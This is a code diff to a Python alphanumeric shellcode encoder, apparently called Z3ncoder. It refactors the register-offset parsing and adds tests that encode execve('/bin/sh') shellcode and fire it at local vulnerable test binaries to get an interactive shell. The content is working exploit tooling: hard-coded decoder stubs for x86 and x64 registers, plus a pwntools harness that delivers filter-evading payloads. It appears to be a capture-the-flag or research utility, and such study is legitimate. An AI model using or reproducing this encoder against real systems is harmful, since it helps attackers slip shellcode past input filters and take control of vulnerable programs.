@@ -16,6 +16,16 @@ except:
 
 alnumset = (string.ascii_letters + string.digits).encode('utf-8')
 
+def extract(start: str) -> Tuple[str, int]:
+    start = start.replace(' ', '').lower()
+    pattern = re.compile(r"\[([^+-]*)\s*([+-]*\s*[0-9a-fA-Fx].*)*\]")
+    result = pattern.match(start)
+    if result is None:
+        return start, None
+    register, offset = result.groups()
+    offset = 0 if offset is None else int(offset, base=0)
+    return register, offset
+
 def findXorMult(target: int) -> Tuple[int, int, int]:
     """
     Find byte, code (32 bit) and dword such that
@@ -93,10 +103,8 @@ class Z3ncoder():
         self._charset: bytes = alnumset
 
     def _gen_decoder(self, start: str) -> bytes:
-        start = start.replace(' ', '').lower()
-        pattern = re.compile(r"\[([^+-]*)\s*([+-]*\s*[0-9a-fA-Fx].*)*\]")
-        result = pattern.match(start)
-        if result is None:
+        register, offset = extract(start)
+        if offset is None:
             return {
                 # x86_32
                 'eax': b'PYhffffk4diXFkDqm02Dqn0D1DuEE',
@@ -124,9 +132,7 @@ class Z3ncoder():
                 'r13': b'AUh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqJHf9kDqX02DqY0D1Iu3M',
                 'r14': b'AVh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqJHf9kDqX02DqY0D1Iu3M',
                 'r15': b'AWh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqJHf9kDqX02DqY0D1Iu3M'
-            }[start]
-        register, offset = result.groups()
-        offset = 0 if offset is None else int(offset, base=0)
+            }[register]
         if offset == 0:
             return {
                 # x86_32
@@ -212,21 +218,57 @@ class Z3ncoder():
         assert self.isinset(encoded_shellcode)
         return encoded_shellcode
 
-if __name__ == '__main__':
+def test_x86():
+    pwn.context.arch = 'i386'
+    pwn.context.bits = 32
+
+    shellcode = pwn.asm(pwn.shellcraft.sh())
+
     encoder = Z3ncoder()
 
-    print('i386 examples execve("/bin/sh", NULL, NULL):')
+    for start in ['eax', '[eax]', '[ebp]', '[ebp-0x10]', '[esp]', '[esp+0x4]']:
+        alnumsc = encoder.encode(shellcode, start).decode('utf-8')
+        print('%s:\n%s\n' % (start, alnumsc))
+        register, offset = extract(start)
+        if offset is None:
+            io = pwn.process(['./vuln/vuln32', '-r', register])
+        else:
+            io = pwn.process(['./vuln/vuln32', '-r', register, '-p', str(offset)])
+        io.sendlineafter(b"> Input your shellcode:\n", alnumsc)
+        io.recvuntil(b"> Executing shellcode...\n")
+        io.sendline(b"whoami")
+        io.interactive()
+
+def test_x64():
+    pwn.context.arch = 'amd64'
+    pwn.context.bits = 64
+
+    shellcode = pwn.asm(pwn.shellcraft.sh())
+
+    encoder = Z3ncoder()
+
+    for start in ['rax', '[rax]', '[rbp]', '[rbp-0x10]', '[rsp]', '[rsp+0x8]']:
+        alnumsc = encoder.encode(shellcode, start).decode('utf-8')
+        print('%s:\n%s\n' % (start, alnumsc))
+        register, offset = extract(start)
+        if offset is None:
+            io = pwn.process(['./vuln/vuln', '-r', register])
+        else:
+            io = pwn.process(['./vuln/vuln', '-r', register, '-p', str(offset)])
+        io.sendlineafter(b"> Input your shellcode:\n", alnumsc)
+        io.recvuntil(b"> Executing shellcode...\n")
+        io.sendline(b"whoami")
+        io.interactive()
+
+if __name__ == '__main__':
+
+    if 1:
+        test_x86()
+        test_x64()
+
     pwn.context.arch = 'i386'
     pwn.context.bits = 32
     shellcode = pwn.asm(pwn.shellcraft.sh())
-    for start in ['eax', '[eax]', '[ebp]', '[ebp-0x10]', '[esp]', '[esp+0x4]']:
-        alnumsc = encoder.encode(shellcode, start)
-        print('%s:\n%s\n' % (start, alnumsc.decode('utf-8')))
 
-    print('amd64 examples execve("/bin/sh", NULL, NULL):')
-    pwn.context.arch = 'amd64'
-    pwn.context.bits = 64
-    shellcode = pwn.asm(pwn.shellcraft.sh())
-    for start in ['rax', '[rax]', '[rbp]', '[rbp-0x10]', '[rsp]', '[rsp+0x8]']:
-        alnumsc = encoder.encode(shellcode, start)
-        print('%s:\n%s\n' % (start, alnumsc.decode('utf-8')))
+    encoder = Z3ncoder()
+    print(encoder.encode(pwn.asm(pwn.shellcraft.sh()), 'eax'))
